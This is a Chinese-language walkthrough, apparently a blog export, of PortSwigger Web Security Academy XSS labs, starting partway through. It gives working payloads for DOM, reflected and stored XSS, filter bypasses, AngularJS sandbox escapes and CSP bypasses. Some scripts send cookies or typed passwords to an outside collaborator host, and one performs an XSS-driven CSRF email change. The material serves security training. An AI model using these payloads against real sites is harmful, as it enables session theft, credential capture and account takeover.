搜索框输入“第三个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 4. 使用 source location.search in innerHTML sink 中的 DOM XSS。 1234567891011// 在页面输入&quot;第四个&quot;&lt;span id=&quot;searchMessage&quot;&gt;第四个&lt;/span&gt;// 插入 XSS 代码第一种方法// 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消&lt;svg onload=alert(4)&gt;&lt;span id=&quot;searchMessage&quot;&gt;&lt;svg onload=&quot;alert(4)&quot;&gt;&lt;/svg&gt;&lt;/span&gt;// 插入 XSS 代码第二种方法// 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件&lt;img src=&#x27;&#x27; onerror=&quot;alert(4)&quot;&gt; 搜索框输入“第四个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 5. 使用 location.search source 在 jQuery 锚点 href 属性接收器中的 DOM XSS Href 不仅可以跳转路径，也可以放入 JS 代码 1https://0a0000b103823255c2ce2cd0003e00a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie) 在 a 标签中 在 a 标签中注入 XSS 代码 6. 在 jQuery 选择器中使用 hashchange 事件的 DOM 型 XSS HTML 内联框架元素 (&lt;iframe&gt;) ，它能够将另一个 HTML 页面嵌入到当前页面中。 1234https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&lt;img src=1 onerror=alert(1)&gt;// 官方给的答案：&lt;iframe src=&quot;https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=x onerror=print(6)&gt;&#x27;&quot;&gt;&lt;/iframe&gt; 12345// 源代码$(window).on(&#x27;hashchange&#x27;, function()&#123;var post = $(&#x27;section.blog-list h2:contains(&#x27; + decodeURIComponent(window.location.hash.slice(1)) + &#x27;)&#x27;);if (post) post.get(0).scrollIntoView();&#125;); 直接在网址注入 服务器中修改 body 7. 带尖括号编码的反射型 XSS 尖括号被编码，但是引号没有，在搜索框输入内容后，发现输入的内容展示在了 input 标签的 value 属性中。 onmouseover 属性在鼠标指针移至元素之上时触发，几乎可使用于所有 HTML 元素，也就不限于搜索框input 内容在 input 标签的 value 属性中 输入 \"onmouseover=\"alert(7) 8. 将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中 评论中输入的内容会成为 a 标签 herf 属性的值 输入 123 查看出于什么位置 javascript:alert(8) 9. 将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中 输入ABC 发现是出现在了 script 标签中，尝试闭合弹出 12var searchTerms = &#x27;ABC&#x27;;document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;); 构造 Payload';alert(9);// 输入 123 查看出于什么位置 ';alert(9);// PRACTITIONER 10. 文档中的 DOM XSS.使用源位置编写接收器.在选择元素内搜索 注入&amp;storeId=&lt;script&gt;alert()&lt;/script&gt; 12345678910111213var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];var store = (new URLSearchParams(window.location.search)).get(&#x27;storeId&#x27;);document.write(&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;);if(store) &#123; document.write(&#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;);&#125;for(var i=0;i&lt;stores.length;i++) &#123; if(stores[i] === store) &#123; continue; &#125; document.write(&#x27;&lt;option&gt;&#x27;+stores[i]+&#x27;&lt;/option&gt;&#x27;);&#125;document.write(&#x27;&lt;/select&gt;&#x27;); 输入 ABC 查看出于什么位置 11. AngularJS 表达式中的 DOM XSS，带有尖括号和双引号HTML 编码 Angular 是一个前端框架，&#123;&#123; ... &#125;&#125; 里头其实就是一个模板表达式，Angular 会对其进行求值并转化为字符串输出。可以放入 JavaScript 脚本 [PayloadsAllTheThings-Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/XSS in Angular.md) 注入：&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125; Constructor 是一个构造函数 12. 反射式 DOM XSS 13. 存储型 XSS replace()，如果第一个参数是字符串，则仅替换第一个匹配项 12345function escapeHTML(html) &#123; return html.replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;);&#125;// 源代码中，通过 replace() 函数，替换第一个匹配项，也就是&lt;&gt;// &amp;lt;代表小于号（&lt;）; &amp;gt;代表大于号（&gt;）","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 XSS 篇(下)","path":"/wiki/portswigger/xss-part2.html","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 14. 利用跨站点脚本窃取 cookie 在 burp 中使用 Burp Collaborator Client，点击 copy to clipboard。 同时提交博客评论，修改 Burp Collaborator 子域名。 脚本的功能：查看评论的人发出 POST 请求以及 读取 cookie。 123456789&lt;script&gt;fetch(&#x27;https://qe8bejkmbudhod20kznmpm8v5mbcz1.oastify.com&#x27;, &#123;method: &#x27;POST&#x27;,mode: &#x27;no-cors&#x27;,body:document.cookie&#125;);&lt;/script&gt;// document.cookie --&gt; JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。 回到 Burp Collaborator，单击“Poll now”，以便看到 Http 交互从而找到 Cookie 值进行替换 刷新 Home 主页，在 Burp Repeater 中，Cookie 替换 Send 发送 15. 利用跨站点脚本捕获密码 依旧是在 burp 中使用 Burp Collaborator Client 功能，点击 copy to clipboard。然后评论博客注入脚本（查看评论的话，会发出包含其用户名和密码的 POST 请求）。 回到 Burp Collaborator，单击“Poll now”，找到用户名和密码进行登录即可 12345678910&lt;input name=username id=username&gt;&lt;input type=password name=password onchange=&quot;if(this.value.length)fetch(&#x27;https://6pwdbg28z2wmxtzpbexotcyig9mzao.oastify.com&#x27;,&#123;method:&#x27;POST&#x27;,mode: &#x27;no-cors&#x27;,body:username.value+&#x27;:&#x27;+this.value&#125;);&quot;&gt;// onchange 事件 --&gt; 当用户改变input输入框内容时执行一段Javascript代码：administrator:2vlk8eidq808je5v2p8v 16. 利用 XSS 执行 CSRF 先进行登录，在更新电子邮件的位置审查元素，会发现存在 CSRF Token，修改电子邮件获取 CSRF Token 的值 将以下脚本写入博客评论中 123456789101112&lt;script&gt;var req = new XMLHttpRequest();req.onload = handleResponse;req.open(&#x27;get&#x27;,&#x27;/my-account&#x27;,true);req.send();function handleResponse() &#123;var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1];var changeReq = new XMLHttpRequest();changeReq.open(&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);changeReq.send(&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)&#125;;&lt;/script&gt; 17. 将 XSS 反射到 HTML 上下文中，大多数标签和属性被阻止 插入 XSS &lt;img src=1 onerror=print()&gt; 发现失败了，用 burp 抓包发送到 Burp Intruder 测试哪些标签和属性被阻止，先清除标签Clear §，然后将搜索词的值换为&lt;§§&gt;，在 XSS 备忘单点击Copy tags to clipboard 在 Burp Intruder 的 Payloads 选项卡中，单击“Paste”粘贴。点击“start attack”。看到了 body 和custom tags 响应 200，于是知道了 body 没有过滤 继而将搜索词的值换为&lt;body%20§§=1&gt;，在 XSS 备忘单点击Copy events to clipboard Clear 删除之前的 Payload，paste 粘贴刚复制的，点击“start attack”，发现 onresize 响应 200 1234// 在 Go to exploit server 的 body 中&lt;iframe src=&quot;https://0a3600a6032533acc04d05d10149009f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width=&#x27;100px&#x27;&gt; // search=&quot;&gt;&lt;body onresize=print()&gt;&quot; --&gt; search=%22%3E%3Cbody%20onresize=print()%3E&quot; 18. 将 XSS 反射到 HTML 上下文中，除了自定义标签外，所有标签都被阻止 自定义标记 XSS 12345&lt;script&gt;location = &#x27;https://0ac80018037267b7c24cf04d00d300df.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#x27;;&lt;/script&gt;// search=&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x&#x27;; 19. 允许带有一些 SVG 标记的反射型 XSS 根据标题，测试一下是否可以用 &lt;svg&gt;。搜索框中输入 123&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;// onBegin() (当元素周期开始时由 onbegin 事件立即触发) 20. 规范链接标签中反映的 XSS 123https://0ad700e904e18a69c0580c0a00f50068.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)%27accesskey=%27x%27onclick=%27alert(1) --&gt; &#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1) 21. 将 XSS 反射为带有单引号和反斜杠转义的 JavaScript 字符串 输入&lt;script&gt;alert(1)&lt;/script&gt;发现（图一） 于是直接使用两个弹窗123&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;（图二） （图一） （图二） 22. 将 XSS 反映到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义 输入后的东西会先被 HTML 编码，然后再被 URL 编码 12345678910// 弹窗&lt;script&gt;alert(1)&lt;/script&gt;// Html 编码&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;// Url 编码%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B// encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。 注意到\\没有进行编码 1123\\&#x27;+alert(1); // 23. 将 XSS 反映到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义 HTML 解码： http://aaa&amp;apos;+alert(1)+&amp;apos; --&gt; http://aaa'+alert(1)+' &amp;apos; 进行 Html 解码后是 ' 1http://aaa&amp;apos;+alert(1)+&amp;apos; EXPERT 24. 带有事件处理程序和 href 属性的反射型 XSS 被阻止 模板字符串 - JavaScript | MDN (mozilla.org) 1$&#123;alert(1)&#125; 25. 在 JavaScript URL 中反映了 XSS 并阻止了一些字符 1&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=&quot;javascript:alert(1)&quot; dur=1s repeatCount=2 /&gt;&lt;text x=20 y=20&gt;Click Me&lt;/text&gt;&lt;/a&gt; 26. 反射 XSS 与 AngularJS 沙箱转义没有字符串 1234567// 问题点angular.module(&#x27;labApp&#x27;, []).controller(&#x27;vulnCtrl&#x27;,function($scope, $parse) &#123;$scope.query = &#123;&#125;;var key = &#x27;search&#x27;;$scope.query[key] = &#x27;123&#x27;;$scope.value = $parse(key)($scope.query);&#125;); 1https://0ae600a2036e6b38c13fc17000230068.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 27. 使用 AngularJS 沙箱转义和 CSP 的反射 XSS 123&lt;script&gt;location=&#x27;https://0a140035033feb4dc106573801c300c2.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x&#x27;;&lt;/script&gt; 28. 受非常严格的 CSP 保护的反射型 XSS，带有悬挂标记攻击 目的是需要修改被害者的 Email 变成 hacker@evil-user.net 需要取 CSRF Token，然后 CSRF PoC 放入 Token，修改邮箱地址…… 30. 受 CSP 保护的反射型 XSS，绕过 CSP 预期解决方案只能在 Chrome 中使用。 123456789https://0a2a00f0049fa705c2fbc4b600460008.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27// 搜索search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27//URL 解码后&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;// unsafe-inline 允许使用内联资源// script-src-elem CSP 内容安全性策略 CSP: script-src-elem - HTTP | MDN (mozilla.org)","tags":[null,null],"categories":[null]}]